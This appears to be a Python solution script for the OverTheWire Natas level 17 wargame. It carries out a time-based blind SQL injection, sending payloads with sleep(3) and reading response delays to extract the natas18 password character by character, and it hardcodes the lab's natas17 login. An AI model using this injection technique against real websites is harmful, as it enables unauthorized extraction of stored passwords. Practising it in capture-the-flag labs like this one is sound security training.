import requests
import string
import sys
from requests.auth import HTTPBasicAuth

basicAuth=HTTPBasicAuth('natas17', 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC')
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

password = ""
length = 32
pos = 1
pos_indicator = "^"
valid_chars = string.digits + string.ascii_letters

url = "http://natas17.natas.labs.overthewire.org/"

while pos < 33:
    for c in valid_chars:
        payload = "username=\" OR IF(username='natas18' AND BINARY substring(password," + str(pos) + ",1) = '" + c + "', sleep(3), False) -- "

        response = requests.post(url, data=payload, headers=headers, auth=basicAuth, verify=False)

        if response.elapsed.total_seconds() > 3:
            password += c
            sys.stdout.write("\r" + password + c)
            sys.stdout.flush()

            break

        sys.stdout.write("\r" + password + c)
        sys.stdout.flush()

        
    pos += 1
